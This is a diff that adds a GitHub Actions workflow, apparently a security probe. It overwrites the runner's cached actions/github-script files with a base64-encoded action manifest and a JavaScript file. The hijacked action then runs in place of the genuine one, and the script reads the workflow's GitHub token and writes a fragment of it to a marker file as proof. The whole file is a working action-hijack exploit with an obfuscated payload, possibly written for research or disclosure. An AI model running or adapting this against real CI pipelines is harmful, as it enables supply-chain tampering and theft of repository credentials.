@@ -1,0 +1,27 @@
+name: zz Manifest Hijack Node Probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: locate and hijack later node action manifest
+        env:
+          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yl90b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KcnVuczoKICB1c2luZzogbm9kZTIwCiAgbWFpbjogcHduLmpzCg=="
+          JS_B64: "Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsKdHJ5e2ZzLmFwcGVuZEZpbGVTeW5jKCcvdG1wL3B3bl9tYXJrZXIudHh0JywnUFdORURfRVhFQyB0b2tlbj0nKyhwcm9jZXNzLmVudi5JTlBVVF9HSVRIVUJfVE9LRU4/cHJvY2Vzcy5lbnYuSU5QVVRfR0lUSFVCX1RPS0VOLnNsaWNlKDAsNCk6J25vbmUnKSsnXG4nKTt9Y2F0Y2goZSl7fQpjb25zb2xlLmxvZygnUFdORURfQUNUSU9OX01BTklGRVNUX0VYRUNVVEVEIHRva2VuX3ByZXNlbnQ9JyshIXByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTik7Cg=="
+        run: |
+          echo "--- work dir ---"; ls -la /home/runner/work 2>&1 | head
+          echo "--- actions dirs ---"; ls -d /home/runner/work/_actions/*/* 2>&1 | head -20
+          d=/home/runner/work/_actions/actions/github-script/f28e40c7f34bde8b3046d885e986cb6290c7db3c
+          echo "--- target ---"; ls -la "$d" 2>&1 | head -8
+          printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml" && echo WROTE_MANIFEST
+          printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js" && echo WROTE_JS
+      - name: use hijacked node action
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c7db3c
+        with:
+          script: console.log('LEGIT_GITHUB_SCRIPT_RAN')
+      - name: proof
+        if: always()
+        run: cat /tmp/pwn_marker.txt 2>&1 || echo NO_MARKER
